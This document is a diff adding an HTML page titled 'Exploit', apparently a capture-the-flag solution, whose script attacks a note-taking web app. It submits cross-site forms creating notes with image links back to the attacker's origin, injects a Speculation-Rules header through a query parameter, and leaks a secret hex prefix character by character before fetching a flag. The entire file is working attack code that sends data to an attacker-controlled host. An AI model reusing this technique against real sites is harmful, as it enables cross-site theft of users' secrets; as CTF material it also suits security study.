@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Exploit</title>
+</head>
+<body>
+	<script type="text/javascript">
+		const WEB_HOST = new URLSearchParams(location.search).get("target");
+
+		const sleep = async (msec) => new Promise((resolve) => setTimeout(resolve, msec));
+
+		const log = async (message) => {
+			console.log(`[LOG] ${message}`)
+			await fetch(`/log?` + encodeURIComponent(message), {
+				mode: "no-cors"
+			});
+		}
+
+		const submitForm = (url, params, options = {}) => {
+			const form = document.createElement("form");
+			form.method = options.method || "POST";
+			form.action = url;
+			form.target = options.target || name;
+			Object.entries(params).forEach(([k, v]) => {
+				const input = document.createElement("input");
+				input.type = "text";
+				input.name = k;
+				input.value = v;
+				form.appendChild(input);
+			});
+			document.body.appendChild(form);
+			form.submit();
+		}
+
+		const N = 8*2;
+		const CHARS = "0123456789abcdef";
+		let prefix = "";
+
+		const waitUntilLeak = async () => {
+			while ((await fetch("/prefix").then(r=>r.text())) === prefix) await sleep(250);
+		}
+
+		const leakOne = async () => {
+			const ws = [];
+			[...CHARS].map(c => {
+				const name = Math.floor(Math.random() * 1000000);
+				const w = open("about:blank", name);
+				submitForm(`${WEB_HOST}/note`, {
+					title: `prefix ${prefix + c}`, 
+					content: `![](${location.origin}/leak?prefix=${prefix + c})`
+				}, { target: name });
+				ws.push(w);
+			});
+			await sleep(1000);
+
+			const w = open(`${WEB_HOST}/?k=Speculation-Rules&v="${location.origin}/rules"`);
+
+			await waitUntilLeak();
+
+			w.close();
+			ws.map(w => w.close());
+		}
+
+		const exploit = async () => {
+			for (let i = 0; i < N; i++) {
+				await leakOne();
+				prefix = await fetch("/prefix").then(r => r.text());
+			}
+			console.log(await fetch("/flag"));
+		};
+
+		(async () => {
+			try {
+				console.log("Start exploit");
+				await exploit();
+				console.log("Finished exploit");
+			} catch (e) {
+				console.log(e);
+				await log(e.toString());
+			}
+		})();
+	</script>
+</body>
+</html>
